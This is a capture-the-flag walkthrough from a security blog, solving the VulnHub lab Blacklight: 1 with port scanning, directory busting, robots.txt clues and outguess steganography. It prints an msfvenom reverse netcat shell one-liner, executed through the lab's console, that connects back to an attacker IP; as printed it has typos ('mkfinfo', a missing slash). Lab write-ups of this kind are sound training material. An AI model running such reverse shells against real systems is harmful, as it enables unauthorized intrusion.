<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Blacklight: 1 (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-blacklight-1-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2018-07-22T07:32:08+00:00">July 22, 2018</time><time class="updated" datetime="2025-06-10T20:29:44+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello everyone. In this article, we’ll be hacking a new lab Blacklight. The motto of the lab is to capture 2 flags. It is made by Carter B (downloadable from <a style="color: #000000;" href="https://www.vulnhub.com/entry/blacklight_1,242/">here</a>) and after a lot of brainstorming, we are presenting before you a really efficient method to get root and capture the flags.</span></p>
<p><span style="color: #000000;"><strong>Steps involved:</strong></span></p>
<ol>
<li><span style="color: #000000;">Network discovery and port scan</span></li>
<li><span style="color: #000000;">Directory busting the server</span></li>
<li><span style="color: #000000;">Accessing robots.txt on the webpage</span></li>
<li><span style="color: #000000;">Capturing flag 1 from robots.txt and discovery of a new port 9072</span></li>
<li><span style="color: #000000;">Connection to port 9072 to upload a netcat reverse shell</span></li>
<li><span style="color: #000000;">Getting root access and capturing the second flag</span></li>
</ol>
<p><span style="color: #000000;">Let’s get started then.</span></p>
<p><span style="color: #000000;">First and foremost, we’ll discover the IP address of the lab. In my case, the IP is 192.168.1.102</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Dkzg3BvngZM/W1Qxp-Wv9XI/AAAAAAAAYd8/euS5IOQr7Y0Gd2_a0JPhVOrZSlC1U_IcQCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Let’s scan all the open ports with the most popular tool nmap. A simple nmap might show fewer ports open so we try the all ports scan:</span></p>
<pre class="lang:default decode:true">nmap -p- -A  192.168.1.102 --open</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-oUZMi05PhMg/W1Qxq_2Lx6I/AAAAAAAAYeI/dgs4WuMv4JgGwhzCgMF2byYjRoncLtwWwCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">We discovered that port 80 is open. So there must be a webpage associated with it. Let’s move towards our browser and check the website.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-M1gk3i2Qey0/W1QxrEcvQGI/AAAAAAAAYeQ/n5ChEEzkitsQ3qz89EaZiBwscbY152tfwCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">There seems nothing interesting here! But wait… maybe there are some directories that could have something valuable for us.</span></p>
<p><span style="color: #000000;">Let’s do a directory buster scan over the IP then.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.102</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-f3vWAoz0rsU/W1QxrvfvauI/AAAAAAAAYeU/nMk3S0UZy_I_DORNvTN-kLY5TunIASsTwCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">We observed that robots.txt is available here. It surely would have some information or some directories that could be beneficial. Let’s go over to our browser and access this.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ww1W55sV2bw/W1Qxr9D_jFI/AAAAAAAAYeY/E005Z-yJ_-whW1CYEmiL1K9jZPIWhNH6ACLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Boom! There it is! Our very first flag. Let’s see what’s in there.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-toLhZ466hC0/W1QxsDzkwHI/AAAAAAAAYec/DbTqcYmc67cdTDxeQlBChOlp1xwDS2KUACLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">We have got a hash as flag1. But the next flag is unknown. But wait, the second line of this file says 9072! So, it has something to do with 9072 port and “the secret is at home” means only one thing–the next flag is at home. But to access home, we’ll have to be rooted.</span></p>
<p><span style="color: #000000;">There is another dictionary file present here but the current use of it is unknown.</span></p>
<p><span style="color: #000000;">Holding that thought, let’s go ahead and try connecting to port 9072 with telnet.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-c_8fXmsjfyY/W1QxpjzN_FI/AAAAAAAAYd0/WlKOvDXMIMoLvhDSPetrYAVZAJ8UXbDPQCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">We successfully connected to a console but there is a restriction provided by the author here. We cannot execute more than 2 commands in this console! As soon as we hit 2 commands the server will quit and the listener won’t accept a connection again.</span></p>
<p><span style="color: #000000;">So, the first command that we type is <strong>.help, </strong>it will show us a list of things that we can do:</span></p>
<pre class="lang:default decode:true">.readhash
.exec
.quit</pre>
<p><span style="color: #000000;">The obvious choice was <strong>.readhash </strong>but here is another fish! It is of no use! Just like the dictionary provided in robots.txt was of no use!</span></p>
<p><span style="color: #000000;">Now, we’ll try and upload a reverse netcat shell over the command line interface using msfvenom:</span></p>
<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.120 lport=4444 R</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-FUdzCH96VOo/W1Qxpy7F-0I/AAAAAAAAYd4/Rb5zMPTE2zoq8T4xC0C3E2cUjjSU6hvMACLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Copy the raw code provided (mkfinfo /tmp/cdbe; nc 192.168.1.120 4444 0&lt;/tmp/cdbe | /bin/sh &gt;tmp/cdbe 2&gt;&amp;1; rm /tmp/cdbe)</span></p>
<p><span style="color: #000000;">We’ll paste this code in the blacklight console using the .exec command:</span></p>
<pre class="lang:default decode:true">.exec mkfinfo /tmp/cdbe; nc 192.168.1.120 4444 0&lt;/tmp/cdbe | /bin/sh &gt;tmp/cdbe 2&gt;&amp;1; rm /tmp/cdbe</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-qs4eN4i5D9I/W1Qxqd5mUSI/AAAAAAAAYeA/mnrIVKXXWOM9qv3AH0sq9nSssqkkfja7QCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">The unique thing about this console is that the output of any command will never be shown. It all will happen in the background and then you’ll have to manually dump it. But let’s not go there as there is no need.</span></p>
<p><span style="color: #000000;">Side by side, let’s set up a netcat listener over port 4444 for the payload we just inserted.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lQdlKCyDHjo/W1QxqqU-ojI/AAAAAAAAYeE/HzG6cOIWl8U8EYo6N8dYhZVzT-NlqMa5gCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">AND WE HAVE A CONNECTION!</span></p>
<pre class="lang:default decode:true">whoami</pre>
<p><span style="color: #000000;">Told us we are in root.</span></p>
<p><span style="color: #000000;">But this is not a proper shell. Let us spawn a pty shell using the python command:</span></p>
<pre class="lang:default decode:true">python -c 'import pty;pty.spawn("/bin/bash")'</pre>
<p><span style="color: #000000;">And we have a proper shell now!</span></p>
<p><span style="color: #000000;">Remember what flag1.txt told us? The secret is at home!</span></p>
<pre class="lang:default decode:true ">cd /home
ls
cd blacklight
ls</pre>
<p><span style="color: #000000;">We found a text file called hash.txt!</span></p>
<p><span style="color: #000000;"><strong>cat hash.txt</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Ht1b1A4xXTk/W1Qxq5Yl7cI/AAAAAAAAYeM/Aa9Ox2VyVSEvN_L5zLowp8VFtUv8qZltACLcBGAs/s1600/16.png"/></span></p>
<div class="separator">We examined the home directory one more time. We found a directory called a secret! Remember when flag1.txt told us that the secret is in the home? Let’s check what is inside the <b>.secret</b> directory.</div>
<div class="separator">We obtained an image file called <b>“flag2-inside.jpg”</b> <b/></div>
<div class="separator">
<pre class="lang:default decode:true">cd /home
cd blacklight
ls -la
cd .secret</pre>
</div>
<div class="separator">It is obvious from the name of the file that the flag is inside this image. So, lets copy it inside the <b>/var/www/html </b>directory.</div>
<div class="separator">
<pre class="lang:default decode:true ">cp flag2-inside.jpg /var/www/html</pre>
</div>
<p><img decoding="async" src="https://4.bp.blogspot.com/-4jbJC46571s/W1bNgLIewDI/AAAAAAAAYf8/OIGQz1_P7qkpPL6kgRXGDjgO5HBTgveuACLcBGAs/s1600/51.png"/></p>
<div class="separator">Let us run this on the web page now! Hmmmm… Why are these two words capitalized?</div>
<div class="separator">Wait! There is a tool called OUTGUESS!</div>
<div/>
<div><img decoding="async" src="https://3.bp.blogspot.com/-l2LKkbgGhVs/W1bNgZmcPjI/AAAAAAAAYgQ/AFbwMorUUHI3xVdIff56TsbvUdGRIDefgCEwYBhgL/s1600/52.png"/></div>
<div>
<div class="separator">Let’s download this image on the Desktop and use outguess to copy the flag hidden in a file called <b>flag2.txt</b></div>
<div class="separator">
<pre class="lang:default decode:true">./outguess -r /root/Desktop/flag2-inside.jpg -t flag2.txt
cat flag2.txt</pre>
<p><img decoding="async" src="https://3.bp.blogspot.com/-zxP-nVKxRDE/W1bNgRstPBI/AAAAAAAAYgM/d4qhtfzD6UE5JLL-QObnNDuyP3sOL2wLgCEwYBhgL/s1600/53.png"/></p>
<p>Finally! We obtained the second flag! Happy Hacking!</p>
</div>
</div>
<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and a left and right brain thinker. contact<strong> <a class="broken_link" style="color: #000000;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
